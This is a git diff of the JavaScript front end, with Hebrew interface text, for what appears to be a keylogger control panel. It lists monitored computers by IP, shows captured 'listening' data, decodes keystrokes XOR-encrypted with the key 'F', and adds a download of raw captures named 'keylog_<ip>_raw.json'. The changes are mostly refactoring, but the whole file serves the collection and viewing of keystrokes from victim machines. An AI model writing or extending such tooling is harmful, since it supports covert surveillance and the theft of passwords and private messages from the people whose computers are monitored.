@@ -1,7 +1,9 @@
 const API_URL = 'http://localhost:5000/api';
 
 let computers = [];
+
 document.addEventListener('DOMContentLoaded', () => {
+    
     const loginForm = document.getElementById('login-form');
     const loginPage = document.getElementById('login-page');
     const dashboardPage = document.getElementById('dashboard-page');
@@ -50,18 +52,16 @@ document.addEventListener('DOMContentLoaded', () => {
         });
     }
 
-
     if (searchInput) {
         searchInput.addEventListener('input', searchComputers);
+        
     }
 });
-
 
 function showAddComputerForm() {
     const form = document.getElementById('add-computer-form');
     form.style.display = form.style.display === 'none' ? 'block' : 'none';
 }
-
 
 async function addComputer() {
     const name = document.getElementById('name').value;
@@ -90,7 +90,6 @@ async function addComputer() {
             return;
         }
         
-
         document.getElementById('add-computer-form').style.display = 'none';
         document.getElementById('name').value = '';
         document.getElementById('ip').value = '';
@@ -102,7 +101,6 @@ async function addComputer() {
         alert("שגיאה בהוספת מחשב");
     }
 }
-
 
 async function removeComputer(ip) {
     if (!confirm("האם אתה בטוח שברצונך למחוק את המחשב?")) {
@@ -128,16 +126,18 @@ async function removeComputer(ip) {
     }
 }
 
-
 async function updateComputersList() {
-    let response = await fetch(`${API_URL}/computers`)
-    if (!response.ok) {
-        throw new Error('שגיאה בטעינת רשימת מחשבים');
+    try {
+        let response = await fetch(`${API_URL}/computers`);
+        if (!response.ok) {
+            throw new Error('שגיאה בטעינת רשימת מחשבים');
+        }
+        computers = await response.json();
+        renderComputersList(computers);
+    } catch (error) {
+        console.error("שגיאה בטעינת רשימת מחשבים:", error);
+        alert("שגיאה בטעינת רשימת מחשבים");
     }
-    computers = await response.json();
-    renderComputersList(computers);
-        
-   
 }
 
 function renderComputersList(computersList) {
@@ -147,7 +147,6 @@ function renderComputersList(computersList) {
     tableBody.innerHTML = '';
 
     computersList.forEach(computer => {
-
         const hasData = computer.data !== false;
 
         const tr = document.createElement('tr');
@@ -166,20 +165,11 @@ function renderComputersList(computersList) {
     });
 }
 
-function startPeriodicRefresh() {
-    setInterval(() => {
-        if (document.getElementById('computers-list').offsetParent !== null) {
-            updateComputersList();
-        }
-    }, 30000); 
-}
 
 
 document.addEventListener('DOMContentLoaded', () => {
     
-    startPeriodicRefresh();
 });
-
 
 async function showMonitoring(ip) {
     try {
@@ -192,8 +182,8 @@ async function showMonitoring(ip) {
         
         const dashboardContent = document.getElementById('dashboard-content');
         dashboardContent.innerHTML = `
+            <h2 class="content-title">פרטי מחשב: ${computer.name}</h2>
             <div class="computer-details">
-                <h2>פרטי מחשב: ${computer.name}</h2>
                 <div class="details-container">
                     <p><strong>IP:</strong> ${computer.ip}</p>
                     <p><strong>סטטוס:</strong> ${computer.status || 'offline'}</p>
@@ -203,7 +193,7 @@ async function showMonitoring(ip) {
                 </div>
                 
                 <div class="actions-container">
-                    <button onclick="updateComputersList()">חזרה לרשימה</button>
+                    <button onclick="showPage('dashboard')">חזרה לרשימה</button>
                     ${computer.data ? 
                         `<button onclick="showListeningData('${computer.ip}')">צפה בנתוני האזנה</button>
                         <button onclick="downloadListeningData('${computer.ip}')">הורד קובץ האזנה</button>` : 
@@ -216,7 +206,6 @@ async function showMonitoring(ip) {
         alert("שגיאה בטעינת פרטי מחשב");
     }
 }
-
 
 async function showListeningData(ip) {
     try {
@@ -233,7 +222,6 @@ async function showListeningData(ip) {
 
         const dashboardContent = document.getElementById('dashboard-content');
         
-
         let contentHTML = '<div class="listening-records">';
         
         if (Object.keys(data).length === 0) {
@@ -249,14 +237,13 @@ async function showListeningData(ip) {
             }
         }
         
-        
         contentHTML += '</div>';
 
         dashboardContent.innerHTML = `
+            <h2 class="content-title">נתוני האזנה של מחשב: ${computerName}</h2>
             <div class="listening-data">
-                <h2>נתוני האזנה של מחשב: ${computerName}</h2>
                 <div class="data-actions">
-                    <button onclick="updateComputersList()">חזרה לרשימה</button>
+                    <button onclick="showPage('dashboard')">חזרה לרשימה</button>
                     <button onclick="showMonitoring('${ip}')">חזרה לפרטי מחשב</button>
                     <button onclick="downloadDecodedData('${ip}')">הורד נתונים מפוענחים</button>
                 </div>
@@ -266,12 +253,11 @@ async function showListeningData(ip) {
             </div>
         `;
 
-        } catch (error) {
-            console.error("שגיאה בטעינת נתוני האזנה:", error);
+    } catch (error) {
+        console.error("שגיאה בטעינת נתוני האזנה:", error);
         alert("שגיאה בטעינת נתוני האזנה");
     }
 }
-
 
 function formatListeningRecord(record) {
     let recordHTML = '<div class="record-content">';
@@ -296,32 +282,9 @@ function formatListeningRecord(record) {
     return recordHTML;
 }
 
-
-
-
-function logout() {
-    localStorage.removeItem('username');
-    const loginPage = document.getElementById('login-page');
-    const dashboardPage = document.getElementById('dashboard-page');
-    
-    if (loginPage && dashboardPage) {
-        loginPage.style.display = 'block';
-        dashboardPage.style.display = 'none';
-        
-        const usernameField = document.getElementById('username');
-        const passwordField = document.getElementById('password');
-        if (usernameField) usernameField.value = '';
-        if (passwordField) passwordField.value = '';
-    } else {
-        console.error("Cannot find login or dashboard elements");
-        window.location.href = window.location.pathname;
-    }
-}
-
-
-
-
 function decryptData(encryptedData, key = "F") {
+    if (!encryptedData) return '';
+    
     let decrypted = '';
     for(let i = 0; i < encryptedData.length; i++) {
         const charCode = encryptedData.charCodeAt(i) ^ key.charCodeAt(0);
@@ -367,13 +330,42 @@ async function downloadDecodedData(ip) {
     }
 }
 
+async function downloadListeningData(ip) {
+    try {
+        const response = await fetch(`${API_URL}/listening/${ip}`);
+        if (!response.ok) {
+            throw new Error('שגיאה בטעינת נתוני האזנה');
+        }
+        
+        const data = await response.json();
+        const jsonString = JSON.stringify(data, null, 2);
+        
+        const blob = new Blob([jsonString], { type: 'application/json' });
+        const url = URL.createObjectURL(blob);
+        const a = document.createElement('a');
+        a.href = url;
+        a.download = `keylog_${ip}_raw.json`;
+        document.body.appendChild(a);
+        a.click();
+        document.body.removeChild(a);
+        URL.revokeObjectURL(url);
+    } catch (error) {
+        console.error("שגיאה בהורדת נתונים:", error);
+        alert("שגיאה בהורדת נתונים גולמיים");
+    }
+}
+
 function processRecordForDownload(record) {
     if (Array.isArray(record)) {
         return record.map(char => decryptData(char)).join('');
     } else if (typeof record === 'object') {
         let text = '';
         for (const key in record) {
-            text += `${key}: ${JSON.stringify(record[key])}\n`;
+            if (Array.isArray(record[key])) {
+                text += `${key}: ${record[key].map(char => decryptData(char)).join('')}\n`;
+            } else {
+                text += `${key}: ${record[key]}\n`;
+            }
         }
         return text;
     } else {
@@ -396,21 +388,55 @@ function showPage(pageName) {
     
     switch(pageName) {
         case 'dashboard':
+            dashboardContent.innerHTML = `
+                <h2 class="content-title">לוח בקרה</h2>
+                <div id="search">
+                    <input type="search" id="search-input" placeholder="חפש מחשב...">
+                    <button id="refresh-button" onclick="updateComputersList()">רענן רשימה</button>
+                </div>
+                <table class="computers">
+                    <thead>
+                        <tr>
+                            <th>שם מחשב</th>
+                            <th>IP</th>
+                            <th>סטטוס</th>
+                            <th>פעילות אחרונה</th>
+                            <th>פעולות</th>
+                        </tr>
+                    </thead>
+                    <tbody id="computers-list"></tbody>
+                </table>
+            `;
             updateComputersList();
+            
+            const searchInput = document.getElementById('search-input');
+            if (searchInput) {
+                searchInput.addEventListener('input', searchComputers);
+            }
             break;
         case 'users':
-            dashboardContent.innerHTML = '<h2>ניהול משתמשים</h2><p>פונקציונליות זו עדיין בפיתוח</p>';
+            dashboardContent.innerHTML = '<h2 class="content-title">ניהול משתמשים</h2><p>פונקציונליות זו עדיין בפיתוח</p>';
             break;
         default:
             updateComputersList();
     }
 }
 
-// Logout function
 function logout() {
     localStorage.removeItem('username');
-    document.getElementById('login-page').style.display = 'block';
-    document.getElementById('dashboard-page').style.display = 'none';
-    document.getElementById('username').value = '';
-    document.getElementById('password').value = '';
+    const loginPage = document.getElementById('login-page');
+    const dashboardPage = document.getElementById('dashboard-page');
+    
+    if (loginPage && dashboardPage) {
+        loginPage.style.display = 'block';
+        dashboardPage.style.display = 'none';
+        
+        const usernameField = document.getElementById('username');
+        const passwordField = document.getElementById('password');
+        if (usernameField) usernameField.value = '';
+        if (passwordField) passwordField.value = '';
+    } else {
+        console.error("Cannot find login or dashboard elements");
+        window.location.href = window.location.pathname;
+    }
 }
